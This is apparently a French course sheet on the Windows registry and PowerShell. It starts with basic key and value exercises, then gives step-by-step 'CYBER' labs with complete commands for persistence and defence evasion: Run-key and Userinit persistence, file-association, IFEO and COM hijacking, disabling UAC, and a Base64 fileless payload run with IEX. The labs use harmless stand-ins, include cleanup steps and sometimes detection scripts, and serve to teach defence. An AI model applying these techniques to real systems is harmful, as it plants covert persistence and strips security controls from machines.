# Fiche Technique 11 : Éditeur de registre

L'Éditeur de registre (`regedit.exe`) est une base de données hiérarchique qui stocke toutes les configurations du système d'exploitation, des composants matériels et des applications logicielles. C'est le "cerveau" de Windows.

## 1. Structure du Registre (Les Ruches)

Le registre est organisé en cinq dossiers principaux appelés "Ruches" (Hives), chacun ayant un rôle spécifique :

* **HKEY_CLASSES_ROOT (HKCR) :** Gère les associations de fichiers (par exemple, quel logiciel ouvre un .pdf) et les objets COM/OLE.
* **HKEY_CURRENT_USER (HKCU) :** Contient la configuration de l'utilisateur actuellement connecté (fond d'écran, thèmes, paramètres de logiciels).
* **HKEY_LOCAL_MACHINE (HKLM) :** La ruche la plus importante. Elle stocke les paramètres globaux de la machine (configuration Windows, pilotes, sécurité), valables pour tous les utilisateurs.
* **HKEY_USERS (HKU) :** Contient les profils de tous les utilisateurs chargés sur la machine.
* **HKEY_CURRENT_CONFIG (HKCC) :** Stocke des informations sur le profil matériel utilisé au démarrage.

## 2. Clés et Valeurs

Le registre fonctionne comme un système de fichiers :

* **Clés :** Elles ressemblent à des dossiers.
* **Sous-clés :** Dossiers contenus dans d'autres dossiers.
* **Valeurs :** Ce sont les données réelles stockées. Il existe plusieurs types :
* **REG_SZ :** Une chaîne de caractères (texte).
* **REG_DWORD :** Un nombre entier (souvent 0 pour désactiver, 1 pour activer).
* **REG_BINARY :** Données binaires brutes.



## 3. Pourquoi modifier le registre ?

La modification du registre permet de personnaliser Windows au-delà de ce que propose l'interface graphique standard, par exemple :

* Désactiver des fonctionnalités système (ex: Cortana ou la télémétrie).
* Modifier le comportement de l'explorateur de fichiers.
* Réparer des erreurs logicielles complexes en supprimant des clés résiduelles.

## 4. Précautions de sécurité

La modification du registre comporte des risques. Une erreur peut empêcher le système de démarrer.

* **Sauvegarde :** Avant toute modification, il est impératif d'exporter la clé concernée (Fichier > Exporter) pour pouvoir la restaurer en cas de problème.
* **Points de restauration :** Créer un point de restauration système est une sécurité supplémentaire.
* **Précision :** Ne jamais supprimer ou modifier une valeur dont vous ne connaissez pas l'utilité exacte.


## 5. Manipulation du registre avec PowerShell

### 1. Se déplacer dans la base de registre
Il est possible de naviguer avec la commande `Set-Location`:
```powershell
PS C:\Windows\system32> Set-Location HKCU:
PS HKCU:\> Get-ChildItem

```
`Get-ChildItem` permet de lister les clés et les valeurs (colonne Property).

### 2. Créer une clé de registre
```powershell
PS C:\Windows\system32> New-Item HKCU:\Temp
```

### 3. Créer une valeur de registre
Une valeur est constituée d'un **nom**, d'un **type** et d'une **donnée**. On utilise la cmdlet `New-ItemProperty`:
```powershell
PS C:\Windows\system32> New-ItemProperty -Path HKCU:\Temp -Name reg1 -Type String -Value 'Contoso'

```

### 4. Récupérer les données de registre
La cmdlet `Get-ItemProperty` permet de récupérer directement la donnée d'une valeur:
```powershell
PS C:\Windows\system32> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

```

### 5. Opérations sur les valeurs (cmdlets spécifiques)
* **Effacer la donnée** : `Clear-ItemProperty` (la valeur existe toujours, mais vide).
* **Renommer** : `Rename-ItemProperty`.
* **Déplacer** : `Move-ItemProperty` (la clé de destination doit exister).
* **Copier** : `Copy-ItemProperty`.
* **Supprimer une valeur** : `Remove-ItemProperty`.
  
### 6. Supprimer une clé de registre
On utilise `Remove-Item` avec le chemin de la clé.
> **Attention** : Cette action est irréversible et supprime toutes les valeurs et sous-clés. Utilisez `-Recurse` pour supprimer une clé contenant des sous-clés sans confirmation.

---
## 6. Exercices
*Note : Les exercices reprennent les objectifs de navigation, création de clés/valeurs et manipulation de l'arborescence (déplacement/copie).*
 Voici une série d'exercices pratiques pour manipuler la base de registre avec PowerShell, basés sur les concepts de votre note de cours.

### Exercice 1 : Navigation et exploration de la base de registre
**Objectif :** Vous familiariser avec la navigation dans la base de registre.

1. **Ouvrez PowerShell et déplacez-vous sur le lecteur `HKLM:` (HKEY_LOCAL_MACHINE)**.

2. **Dans ce lecteur, listez le contenu de la clé de registre `SYSTEM**`.

3. **Déplacez-vous ensuite dans la sous-clé `CurrentControlSet` qui se trouve sous `SYSTEM**`.

4. À partir de cet emplacement, trouvez la valeur qui contient le nom du système d'exploitation Windows. Affichez uniquement sa valeur.

5. **Revenez au lecteur par défaut (`C:`)**.



---

### Exercice 2 : Création et manipulation de clés et de valeurs
**Objectif :** Créer, modifier et supprimer des clés et des valeurs dans la ruche HKEY_CURRENT_USER (`HKCU:`).

1. **Déplacez-vous sur le lecteur `HKCU:**`.

2. **Créez une nouvelle clé de registre appelée `MonApplication` à la racine de HKCU**.

3. **Dans cette nouvelle clé `MonApplication`, créez une valeur de registre nommée `Version**`.

* Le type de la valeur sera une chaîne de caractères (`String`).
* La donnée de la valeur sera `1.0.0`.

4. **Affichez la valeur que vous venez de créer pour confirmer qu'elle est correcte**.


5. **Renommez la valeur `Version` en `NumeroDeVersion**`.

6. **Créez une nouvelle valeur de registre dans la même clé `MonApplication`, nommée `DateDerniereMiseAJour` avec le type `String` et la donnée `2025-08-22**`.

7. **Affichez toutes les valeurs présentes dans la clé `MonApplication**`.

---

### Exercice 3 : Déplacement et copie
**Objectif :** Pratiquer le déplacement et la copie d'une clé de registre.

1. **Assurez-vous d'être sur le lecteur `HKCU:**`.

2. **Créez une nouvelle clé de registre appelée `AnciennesVersions**`.

3. **Déplacez la clé `MonApplication` et toutes les valeurs qu'elle contient vers la clé `AnciennesVersions**`.

4. **Copiez la clé `AnciennesVersions` dans une nouvelle clé nommée `CopieAnciennesVersions**`.

5. **Enfin, nettoyez votre environnement en supprimant les clés `AnciennesVersions` et `CopieAnciennesVersions**`.

* *Note : Utilisez le paramètre `-Recurse` pour la suppression des clés qui contiennent des sous-clés ou des valeurs*.
---
# SUITE Adaptation en exercices CYBER, guidés sur PowerShell pour l'étude de cas
---
# Exercice 4: CYBER >>> Automatisation de la Persistance via PowerShell
**Objectif :** Reproduire le mécanisme de lancement automatique d'un programme au démarrage de la session utilisateur, mais de manière scriptée avec les cmdlets de registre.

### Mise en situation
Vous devez configurer le lancement automatique d'un outil de monitoring situé à l'emplacement suivant : `C:\Users\Public\Documents\monitor.exe`. Pour cela, vous allez manipuler la clé "Run" de l'utilisateur courant.

---
### Étape 1 : Navigation vers la clé cible
Au lieu de naviguer avec la souris dans `regedit`, déplacez-vous directement dans l'arborescence du registre via PowerShell.
**Action :** Déplacez votre emplacement vers la clé `CurrentVersion`.

* *Indice :* Utilisez `Set-Location` sur le lecteur `HKCU:`.
```powershell
# Votre commande ici
Set-Location "HKCU:\Software\Microsoft\Windows\CurrentVersion"

```

---
### Étape 2 : Vérification de l'existence de la sous-clé "Run"
Avant de créer une valeur, il est de bon usage de vérifier si la clé "Run" existe et ce qu'elle contient.
**Action :** Listez le contenu de la clé `Run`.

```powershell
# Votre commande ici
Get-ChildItem -Path .\Run

```

---
### Étape 3 : Création de la valeur de persistance
C'est ici que vous remplacez le "Clic droit > Nouveau > Valeur chaîne". Vous allez créer une propriété nommée `SecurityUpdate` pour pointer vers votre exécutable.
**Action :** Créez une nouvelle valeur de registre dans `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`.

* **Nom :** `SecurityUpdate`.
* **Type :** `String`.
* **Valeur :** `C:\Users\Public\Documents\monitor.exe`.

* *Indice :* Utilisez `New-ItemProperty`.
```powershell
# Votre commande ici
New-ItemProperty -Path .\Run -Name "SecurityUpdate" -PropertyType String -Value "C:\Users\Public\Documents\monitor.exe"

```

---
### Étape 4 : Vérification de la configuration
Assurez-vous que la donnée a bien été enregistrée sans ouvrir l'éditeur graphique.
**Action :** Récupérez la donnée de la valeur `SecurityUpdate`.

```powershell
# Votre commande ici
Get-ItemProperty -Path .\Run -Name "SecurityUpdate"

```

---
### Étape 5 : Nettoyage (Simuler la suppression de la persistance)
Une fois l'exercice terminé, il est important de savoir supprimer cette entrée.
**Action :** Supprimez la valeur `SecurityUpdate` que vous venez de créer.
* *Indice :* Utilisez `Remove-ItemProperty`.



```powershell
# Votre commande ici
Remove-ItemProperty -Path .\Run -Name "SecurityUpdate"

```

---

**Question de réflexion :**
Si vous aviez voulu appliquer cette persistance à **tous les utilisateurs** de la machine et non seulement à l'utilisateur actuel, quel lecteur auriez-vous dû utiliser au début de l'exercice?

**Réponse attendue :** Le lecteur `HKLM:` (HKEY_LOCAL_MACHINE) car il contient les paramètres s'appliquant à tous les utilisateurs.

---
Voici un exercice guidé pour réaliser cette technique de détournement d'extension (**Shell Open Hijacking**) via PowerShell, en vous basant sur la structure de vos notes de cours.

---

# Exercice 5 : CYBER >>> Détournement d'Association de Fichier via PowerShell
**Objectif :** Modifier le comportement du système pour qu'à l'ouverture d'un fichier `.txt`, un script de log s'exécute avant d'ouvrir le bloc-notes.

### Étape 1 : Exploration de l'association actuelle
Avant de modifier quoi que ce soit, il faut identifier quel identifiant de programme (**ProgID**) est lié à l'extension `.txt`.
**Action :** Vérifiez la valeur par défaut de la clé `.txt` dans les classes de l'utilisateur.
* *Note :* Dans le registre, la valeur par défaut est récupérée en ciblant le nom `(default)` ou une chaîne vide `""`.

```powershell
# [cite_start]Navigation vers les classes de l'utilisateur [cite: 365]
Set-Location "HKCU:\Software\Classes\.txt"

# [cite_start]Lecture de la valeur par défaut pour trouver le ProgID [cite: 316]
Get-ItemProperty -Path . -Name ""

```

---
### Étape 2 : Création de l'arborescence de détournement
Si nous voulons détourner l'action "ouvrir", nous devons accéder à la clé `shell\open\command` du ProgID identifié (souvent `txtfile`). Si elle n'existe pas dans `HKCU`, nous devons la créer pour qu'elle prime sur les paramètres système `HKLM`.
**Action :** Créez la structure de clés nécessaire.
* *Indice :* Utilisez `New-Item` avec le paramètre `-Force` pour créer toute l'arborescence d'un coup.
```powershell
# [cite_start]Création de la hiérarchie de clés [cite: 305]
New-Item -Path "HKCU:\Software\Classes\txtfile\shell\open\command" -Force

```

---
### Étape 3 : Injection de la commande de détournement
Nous allons maintenant remplacer la commande d'ouverture normale par une commande combinée : elle lancera un message d'alerte (simulant le malware) puis le fichier avec Notepad.
**Action :** Définissez la valeur par défaut de la clé `command` avec la charge utile suivante :
`cmd.exe /c "echo Alerte de securite & notepad.exe %1"`
* **Nom :** `""` (pour la valeur par défaut).
* **Type :** `String`.
* **Valeur :** La commande ci-dessus.
```powershell
# [cite_start]Modification de la valeur de commande [cite: 311, 312]
Set-ItemProperty -Path "HKCU:\Software\Classes\txtfile\shell\open\command" -Name "" -Value 'cmd.exe /c "echo Alerte de securite & notepad.exe %1"'

```

---
### Étape 4 : Vérification du détournement
Vérifiez que votre commande est bien enregistrée dans le registre avant de tester manuellement en ouvrant un fichier texte.
**Action :** Affichez la propriété configurée.

```powershell
# [cite_start]Récupération de la donnée pour vérification [cite: 314, 316]
Get-ItemProperty -Path "HKCU:\Software\Classes\txtfile\shell\open\command" -Name ""

```

---
### Étape 5 : Nettoyage du système
Il est crucial de remettre le système dans son état d'origine pour que vos fichiers texte s'ouvrent à nouveau normalement.
**Action :** Supprimez la clé `txtfile` créée dans votre ruche utilisateur pour laisser le système reprendre la configuration par défaut de `HKLM`.

```powershell
# [cite_start]Suppression récursive de la clé de détournement [cite: 346, 350]
Remove-Item -Path "HKCU:\Software\Classes\txtfile" -Recurse

```

**Analyse de la méthode (Côté défenseur) :**
Pourquoi cette méthode est-elle plus discrète qu'une clé "Run" ?

* **Réponse :** Elle ne lance pas le processus au démarrage (moment très surveillé), mais elle attend une action légitime de l'utilisateur (ouvrir un document) pour s'exécuter silencieusement en arrière-plan tout en affichant le document attendu.

---
# Exercice 6 : CYBER >>>: Détournement via les "Image File Execution Options" (IFEO)
**Objectif :** Utiliser PowerShell pour configurer un "débogueur" factice sur un utilitaire Windows (le Bloc-notes), afin de comprendre comment un attaquant peut intercepter le lancement d'un programme.

### Étape 1 : Localisation de la clé IFEO
Contrairement aux exercices précédents, cette manipulation touche à la configuration globale de la machine. Nous allons donc travailler dans la ruche `HKEY_LOCAL_MACHINE`.
**Action :** Positionnez-vous dans le répertoire des options d'exécution de fichiers images.
* *Note :* L'utilisation d'une console PowerShell en **mode Administrateur** est ici indispensable.
```powershell
# Navigation vers la clé IFEO
Set-Location "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

```

---
### Étape 2 : Création de la cible (Le "Hook")
Nous allons cibler le processus `notepad.exe`. Pour cela, il faut créer une nouvelle clé portant exactement le nom de l'exécutable.
**Action :** Créez une nouvelle clé nommée `notepad.exe`.
* *Indice :* Utilisez `New-Item`.
```powershell
# Création de la clé cible pour le programme à détourner
New-Item -Name "notepad.exe"

```

---
### Étape 3 : Configuration du détournement (Le "Debugger")
C'est ici que l'on injecte la commande de remplacement. Au lieu de lancer le Bloc-notes, nous allons forcer Windows à lancer la calculatrice (`calc.exe`).
**Action :** Dans la clé `notepad.exe` que vous venez de créer, ajoutez une valeur de type chaîne.
* **Nom :** `Debugger`.
* **Valeur :** `C:\Windows\System32\calc.exe`.
* *Indice :* Utilisez `New-ItemProperty`.
```powershell
# Injection du "débogueur" de substitution
New-ItemProperty -Path ".\notepad.exe" -Name "Debugger" -PropertyType String -Value "C:\Windows\System32\calc.exe"

```

---
### Étape 4 : Test du détournement
**Action :** Essayez d'ouvrir le Bloc-notes (via le menu Démarrer ou en tapant `notepad` dans PowerShell).
* **Résultat attendu :** La calculatrice s'ouvre, mais le Bloc-notes ne s'affiche jamais. Windows a cru lancer un débogueur pour aider au lancement de notepad, mais il a simplement exécuté votre programme de substitution.

---
### Étape 5 : Nettoyage et Restauration
Il est impératif de supprimer cette clé pour retrouver l'usage normal de vos outils système.

**Action :** Supprimez la clé `notepad.exe` de l'arborescence IFEO.

```powershell
# Suppression du détournement
Remove-Item -Path ".\notepad.exe" -Recurse

```

---
### Analyse de sécurité (Cas des "Sticky Keys")
 
**Question :** Selon vous, pourquoi le détournement de `sethc.exe` via la valeur `Debugger = cmd.exe` est-il plus dangereux que les autres méthodes de persistance ?

**Réponse attendue :** Car il permet d'accéder à une console `SYSTEM` depuis l'écran de verrouillage (en appuyant 5 fois sur MAJ), sans avoir besoin de connaître le mot de passe d'un utilisateur, car le processus `sethc.exe` est géré par le système avant même l'ouverture de session.

---
Voici l'adaptation de cette technique en exercice guidé PowerShell. Cet exercice est crucial pour comprendre comment les paramètres de sécurité critique du système peuvent être altérés via le registre.

---

# Exercice 7 : CYBER >>> Modification des Politiques Système (Désactivation de l'UAC)

**Objectif :** Utiliser PowerShell pour identifier et modifier la clé de contrôle de compte d'utilisateur (**UAC**). Vous apprendrez à manipuler les politiques de sécurité (Policies) du système.

### Étape 1 : Localisation de la politique système
Les paramètres de sécurité globaux de Windows, comme l'UAC, se trouvent dans la ruche `HKEY_LOCAL_MACHINE`, car ils s'appliquent à l'ensemble de l'ordinateur.
**Action :** Positionnez-vous dans la clé `System` des politiques locales.
* *Note :* Cet exercice nécessite impérativement les droits **Administrateur**.

```powershell
# Navigation vers la clé des politiques système
Set-Location "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

```

---
### Étape 2 : Analyse de la valeur `EnableLUA`
La valeur `EnableLUA` définit si l'UAC est actif ou non.

* `1` : UAC activé (Comportement normal).
* `0` : UAC désactivé (Danger : plus de demandes de confirmation).

**Action :** Vérifiez l'état actuel de l'UAC sur votre machine.

* *Indice :* Utilisez `Get-ItemProperty`.
```powershell
# Vérification de la valeur actuelle
Get-ItemProperty -Path . -Name "EnableLUA"

```

---
### Étape 3 : Simulation de la désactivation (Attaque)
Un attaquant cherchera à passer cette valeur à `0` pour ne plus être gêné par les fenêtres de confirmation lors de l'exécution de programmes malveillants.

**Action :** Modifiez la donnée de `EnableLUA` pour la passer à `0`.

* *Indice :* Utilisez `Set-ItemProperty`.
```powershell
# Désactivation de l'UAC via le registre
Set-ItemProperty -Path . -Name "EnableLUA" -Value 0

```

---
### Étape 4 : Confirmation du changement
Contrairement aux fichiers, certains changements de registre système ne sont effectifs qu'après un redémarrage, mais la valeur dans la base de données est modifiée instantanément.

**Action :** Vérifiez que la valeur est bien passée à `0`.

```powershell
# Confirmation de la modification
(Get-ItemProperty -Path . -Name "EnableLUA").EnableLUA

```

---
### Étape 5 : Restauration de la sécurité (Remédiation)
Il est essentiel pour la sécurité de votre poste de réactiver l'UAC immédiatement.
**Action :** Remettez la valeur `EnableLUA` à `1`.

```powershell
# Réactivation de l'UAC
Set-ItemProperty -Path . -Name "EnableLUA" -Value 1

```

---
### Pourquoi cette méthode est-elle redoutable ?

1. **Invisibilité immédiate :** L'utilisateur ne reçoit aucune alerte indiquant que son UAC a été désactivé. Le changement ne devient visible (par l'absence de pop-up) qu'après le prochain redémarrage.
2. **Élévation facilitée :** Une fois l'UAC à 0, n'importe quel script lancé par l'utilisateur s'exécutera avec les privilèges maximum sans aucune barrière visuelle.

---

**Question de synthèse :**
Si vous vouliez automatiser cette vérification sur 100 serveurs pour vous assurer que l'UAC est bien activé partout, quelle cmdlet PowerShell utiliseriez-vous pour lire la valeur à distance ?

**Réponse attendue :** `Get-ItemProperty` (souvent combiné avec `Invoke-Command` pour le lancement à distance).
 
---
Voici l'adaptation en exercice guidé PowerShell pour l'étude de cas n°6. Cette technique est particulièrement intéressante car elle montre comment PowerShell peut manipuler des chaînes de caractères complexes dans le registre pour une exécution "en chaîne".

---

# Exercice 8 : CYBER >>> Détournement du processus d'initialisation (Userinit)
**Objectif :** Utiliser PowerShell pour auditer et modifier la clé `Userinit` afin de simuler l'ajout d'un script de log personnalisé lors de l'ouverture de session.
### Étape 1 : Localisation et Lecture de la valeur critique
Le processus `Winlogon` est un composant central du système. Sa configuration se trouve dans la ruche logicielle de `HKEY_LOCAL_MACHINE`.
**Action :** Accédez à la clé `Winlogon` et affichez la valeur actuelle de `Userinit`.
* *Note :* Cet exercice nécessite les droits **Administrateur**.
```powershell
# Navigation vers la clé Winlogon
Set-Location "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Lecture de la valeur Userinit
Get-ItemProperty -Path . -Name "Userinit"

```

---
### Étape 2 : Analyse de la "virgule fatale"
Comme indiqué dans votre cours, la valeur `Userinit` est particulière car elle se termine par une virgule. Avant toute modification, nous allons stocker la valeur d'origine pour ne pas casser le système.
**Action :** Sauvegardez la valeur actuelle dans une variable.
```powershell
# Sauvegarde de la valeur propre
$originalUserinit = (Get-ItemProperty -Path . -Name "Userinit").Userinit
Write-Host "Valeur actuelle : $originalUserinit"

```

---
### Étape 3 : Injection de la persistance (Exécution en chaîne)
Nous allons maintenant simuler l'attaque en ajoutant un deuxième chemin (celui de notre "malware" factice) après la virgule.
*Charge utile cible :* `C:\Windows\system32\userinit.exe,C:\Users\Public\script_persistance.exe`
**Action :** Modifiez la valeur pour ajouter le second chemin.
* *Indice :* Faites attention à ne pas supprimer le chemin vers `userinit.exe` original !
```powershell
# Création de la nouvelle chaîne de caractères
$maliciousValue = $originalUserinit + "C:\Users\Public\script_persistance.exe"

# Application de la modification
Set-ItemProperty -Path . -Name "Userinit" -Value $maliciousValue

```

---
### Étape 4 : Audit Forensics (Analyse de détection)
Imaginez que vous êtes un analyste en cybersécurité. Vous devez créer un script rapide pour vérifier si cette clé a été détournée.
**Action :** Utilisez PowerShell pour vérifier si la valeur contient plus d'un chemin (présence de texte après la première virgule).
```powershell
# Script de détection simple
$currentValue = (Get-ItemProperty -Path . -Name "Userinit").Userinit
if ($currentValue -match ",.+$") {
    Write-Warning "ALERTE : Une anomalie a été détectée dans la clé Userinit !"
} else {
    Write-Host "Système sain." -ForegroundColor Green
}

```

---
### Étape 5 : Restauration du système
Pour éviter tout problème au prochain redémarrage, rétablissez la valeur d'origine.
**Action :** Remettez la clé `Userinit` dans son état initial.

```powershell
# Restauration via la variable sauvegardée à l'étape 2
Set-ItemProperty -Path . -Name "Userinit" -Value $originalUserinit

```

---
### Pourquoi cette méthode est-elle redoutable selon vos notes ?

1. **Résilience :** Le processus `userinit.exe` étant de confiance, les modifications passent souvent pour des scripts d'entreprise.
2. **Exécution précoce :** Elle intervient avant même l'affichage du bureau (`explorer.exe`).

 
---
# Exercice 9 : CYBER >>> Technique du "Fileless Malware" (Stockage en Registre)
**Objectif :** Simuler le stockage d'un script complet dans une clé de registre et créer une amorce capable de le lire et de l'exécuter sans que le script ne soit jamais présent sous forme de fichier sur le disque.
### Étape 1 : Préparation de la charge utile (Payload)
Nous allons simuler un script inoffensif (qui affiche "Système compromis (Simulé)") mais nous allons l'encoder en Base64 pour le rendre illisible à l'œil nu, comme le ferait un attaquant.
**Action :** Encodez une commande PowerShell en Base64.
```powershell
# Le script à cacher
$script = 'Write-Host "ALERTE : Code execute directement depuis la RAM !" -ForegroundColor Red'

# Encodage en Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encodedScript = [Convert]::ToBase64String($bytes)

Write-Host "Votre payload encode : $encodedScript"

```

---
### Étape 2 : Stockage de la charge utile dans le registre
Nous allons cacher ce code dans une clé qui semble technique et légitime (un CLSID fictif) dans la ruche utilisateur.
**Action :** Créez une clé de registre obscure et stockez-y le script encodé.
```powershell
# Création d'une clé simulant un identifiant système
$path = "HKCU:\Software\Classes\CLSID\{A8B1-F92C-41D0-9234}"
New-Item -Path $path -Force

# Stockage du script dans une valeur nommée "Data"
New-ItemProperty -Path $path -Name "Data" -PropertyType String -Value $encodedScript

```

---
### Étape 3 : Création de l'amorce (Trigger)
L'amorce est une petite commande qui va chercher le code dans le registre, le décode et l'exécute avec la commande `IEX` (Invoke-Expression).
**Action :** Testez la commande qui permet de lire et d'exécuter le code stocké à l'étape précédente.
```powershell
# Commande de lecture et d'exécution
$trigger = "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty '$path').Data)))"

# Test de l'exécution
Invoke-Expression $trigger

```

---
### Étape 4 : Mise en place de la persistance (Optionnel)
Pour qu'un attaquant n'ait plus rien à faire, il placerait cette commande d'amorce dans une clé de démarrage (Run).
**Action :** (Théorique) Imaginez la commande pour placer ce trigger dans la clé Run vue à l'exercice 1.
```powershell
# NE PAS EXECUTER - Exemple de persistance réelle
# Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "powershell.exe -WindowStyle Hidden -Command $trigger"

```

---
### Étape 5 : Analyse Forensics (Détection par script)
En tant que défenseur, vous devez détecter les valeurs de registre trop volumineuses qui pourraient contenir du code caché.
**Action :** Listez les valeurs de la clé CLSID et vérifiez leur longueur.
```powershell
# Audit de la taille des données
$valeur = Get-ItemProperty -Path $path
$taille = $valeur.Data.Length

Write-Host "Analyse de la cle : $path"
Write-Host "Taille de la chaine detectee : $taille caracteres"

if ($taille -gt 50) {
    Write-Warning "Suspicion de Fileless Malware : Valeur anormalement longue detectee !"
}

```

---
# Exercice 10 : CYBER >>> Détournement d'objets COM (COM Hijacking)

**Objectif :** Utiliser PowerShell pour détourner un composant système (le gestionnaire de dossiers) afin qu'il exécute une action personnalisée à chaque fois que l'utilisateur ouvre son explorateur de fichiers.

### Étape 1 : Comprendre le mécanisme de priorité
Windows cherche les objets COM d'abord dans la ruche utilisateur (`HKCU`) avant de regarder dans la ruche système (`HKLM`). Si un attaquant crée une copie d'un objet système dans `HKCU`, sa version sera exécutée en priorité.
**Action :** Définissez les variables pour un objet COM très courant (le "Folder Background" utilisé par l'Explorateur).
```powershell
# Identifiant de classe (CLSID) pour l'objet de fond de dossier
$clsid = "{00021401-0000-0000-C000-000000000046}"
$path = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"

```

---
### Étape 2 : Création de l'arborescence de détournement
Nous allons créer la structure de clés nécessaire dans la ruche utilisateur. Comme l'objet n'existe probablement pas encore dans `HKCU`, nous devons le créer.
**Action :** Créez la clé `InprocServer32` pour ce CLSID.

```powershell
# Création récursive de la clé
New-Item -Path $path -Force

```

---
### Étape 3 : Injection du script de détournement
Au lieu de pointer vers une bibliothèque système (`.dll`), nous allons faire pointer la valeur par défaut vers un script ou un exécutable de notre choix. Pour cet exercice, nous utiliserons `calc.exe`.
**Action :** Modifiez la valeur par défaut et définissez le modèle de threading.
```powershell
# Définir le chemin vers l'exécutable de "remplacement"
Set-ItemProperty -Path $path -Name "(default)" -Value "C:\Windows\System32\calc.exe"

# Définir le ThreadingModel (requis pour que l'objet soit valide)
New-ItemProperty -Path $path -Name "ThreadingModel" -PropertyType String -Value "Apartment"

```

---
### Étape 4 : Test et Observation
**Action :** Ouvrez simplement l'Explorateur de fichiers Windows (touche Windows + E) ou faites un clic droit sur le bureau.
* **Résultat attendu :** La calculatrice devrait se lancer. Windows, en voulant charger les fonctions d'affichage des dossiers, a lu votre entrée dans `HKCU` et a exécuté `calc.exe` au lieu de la bibliothèque système habituelle.

---
### Étape 5 : Nettoyage Forensics
Il est crucial de ne pas laisser ce détournement actif car il ralentit et perturbe le système.

**Action :** Supprimez la clé CLSID que vous avez créée dans la ruche utilisateur.

```powershell
# Suppression du détournement COM
Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse

```

---
### Pourquoi cette méthode est-elle redoutable ?

1. **Pas de droits Admin :** Comme on modifie `HKCU` (la ruche utilisateur), aucun privilège administrateur n'est requis.
2. **Invisibilité :** Aucun nouveau processus n'est créé au démarrage. Le code malveillant attend simplement que le système ait besoin d'une fonction standard pour "s'inviter" dans le processus légitime.
3. **Persistance profonde :** Il existe des milliers d'objets COM dans Windows, rendant la surveillance manuelle presque impossible sans outils spécialisés.

 
